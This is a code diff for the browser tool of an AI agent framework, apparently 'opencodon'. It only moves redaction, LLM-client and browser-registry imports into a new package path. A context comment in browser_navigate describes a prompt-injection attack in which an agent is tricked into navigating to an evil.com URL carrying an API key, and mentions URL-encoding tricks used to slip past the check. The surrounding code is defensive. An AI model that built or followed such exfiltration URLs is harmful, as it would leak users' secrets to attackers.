@@ -64,8 +64,8 @@ import time
 import requests
 from typing import Dict, Any, Optional, List, Tuple, Union
 from pathlib import Path
-from agent.auxiliary_client import call_llm
-from agent.redact import redact_cdp_url
+from opencodon.core.auxiliary_client import call_llm
+from opencodon.core.redact import redact_cdp_url
 from opencodon_constants import agent_browser_runnable, get_opencodon_home
 from utils import env_int, is_truthy_value
 from opencodon.config import DEFAULT_CONFIG, cfg_get
@@ -126,8 +126,8 @@ except Exception:
 # and into ``plugins/browser/<vendor>/``. The dispatcher consults the
 # registry; the legacy class names are re-exported below as backward-compat
 # shims for callers that import them from this module.
-from agent.browser_provider import BrowserProvider as CloudBrowserProvider  # noqa: F401  (legacy alias)
-from agent.browser_registry import (  # noqa: F401  (test-patchable surface)
+from opencodon.core.browser_provider import BrowserProvider as CloudBrowserProvider  # noqa: F401  (legacy alias)
+from opencodon.core.browser_registry import (  # noqa: F401  (test-patchable surface)
     get_provider as _registry_get_browser_provider,
 )
 from plugins.browser.browserbase.provider import (  # noqa: F401  (legacy import surface)
@@ -2645,7 +2645,7 @@ def _store_full_snapshot(snapshot_text: str) -> Optional[str]:
     try:
         import hashlib
         from opencodon_constants import get_opencodon_dir
-        from agent.redact import redact_sensitive_text
+        from opencodon.core.redact import redact_sensitive_text
 
         content = redact_sensitive_text(snapshot_text, force=True)
         if len(content) > MAX_STORED_SNAPSHOT_CHARS:
@@ -2707,7 +2707,7 @@ def _extract_relevant_content(
     # Without this, a page displaying env vars or API keys would leak
     # secrets to the extraction model before run_agent.py's general
     # redaction layer ever sees the tool result.
-    from agent.redact import redact_sensitive_text
+    from opencodon.core.redact import redact_sensitive_text
     extraction_prompt = redact_sensitive_text(extraction_prompt)
 
     try:
@@ -2785,7 +2785,7 @@ def _redact_browser_output(value: Any) -> Any:
     Tool output is a model boundary, so force redaction here even if global log
     redaction is disabled for debugging.
     """
-    from agent.redact import redact_sensitive_text
+    from opencodon.core.redact import redact_sensitive_text
 
     if isinstance(value, str):
         return redact_sensitive_text(value, force=True)
@@ -2818,7 +2818,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
     # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
     import urllib.parse
-    from agent.redact import _PREFIX_RE
+    from opencodon.core.redact import _PREFIX_RE
     url_decoded = urllib.parse.unquote(url)
     if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
         return json.dumps({
@@ -3196,7 +3196,7 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
     # Use fill command (clears then types)
     result = _run_browser_command(effective_task_id, "fill", [ref, text])
 
-    from agent.display import (
+    from opencodon.core.display import (
         redact_browser_typed_text_for_display,
         redact_tool_args_for_display,
     )
@@ -4305,7 +4305,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
 
         analysis = (response.choices[0].message.content or "").strip()
         # Redact secrets the vision LLM may have read from the screenshot.
-        from agent.redact import redact_sensitive_text
+        from opencodon.core.redact import redact_sensitive_text
         analysis = redact_sensitive_text(analysis)
         response_data = {
             "success": True,
